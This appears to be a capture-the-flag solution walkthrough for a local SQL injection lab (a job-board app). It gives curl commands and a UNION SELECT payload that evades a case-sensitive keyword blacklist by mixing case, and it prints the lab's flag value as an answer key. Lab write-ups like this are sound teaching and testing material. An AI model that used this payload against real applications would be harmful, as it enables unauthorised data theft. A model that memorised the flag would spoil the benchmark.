# SOLUTION — alder (walkthrough, spoilers + flag)

Attack Drills series · `sqli/` · entry `http://127.0.0.1:18941`.
Commands assume the shot is armed and reachable on `127.0.0.1`
(`cp .env.example .env && docker compose up -d --build`). The flag value
below is the field-verified run's value, reproduced exactly as captured
(flags are public by policy; your own `FLAG` build arg will differ).

---

1. The front page is a job board; the form POSTs JSON to `/jobs`. Probe it:

   ```bash
   curl -s http://127.0.0.1:18941/jobs -H 'Content-Type: application/json' \
        -d '{"job_type": "front-end"}'
   ```

   Asking for `private` gets a 403 ("Only admins can see private jobs") —
   and a quote or parenthesis in `job_type` breaks the response: classic
   injection into `SELECT * FROM jobs WHERE type = '<input>'`.

2. The filter strips a fixed, case-sensitive word list (`OR`, `AND`,
   `SELECT`, `UNION`, `FROM`, `WHERE` and their lowercase twins) — it does
   not recurse, and mixed case sails through. Build a UNION that pulls every
   row including the private one:

   ```bash
   curl -s http://127.0.0.1:18941/jobs -H 'Content-Type: application/json' \
        -d '{"job_type": "'\'' unION aLL sElECT id,name,type,description FrOM jobs -- -"}'
   ```

   (`unION` / `sElECT` / `FrOM` dodge the exact-match blacklist; `-- -`
   comments out the trailing quote.)

3. Among the returned rows: `{"name": "Hidden job", "type": "private",
   "description": "FLAG{...}"}` — that description **is** the flag:

   ```
   FLAG{xbow_alder_b580d63971320cf5811939bd}}
   ```

> Field note: the blacklist is exact-match only — the whole puzzle is
> noticing that `UnIoN` ≠ `UNION` to the filter; no double-write tricks
> needed.

---


---

## Flag (field-verified run)

```
FLAG{xbow_alder_b580d63971320cf5811939bd}}
```

Location: sqlite row `private` job description.
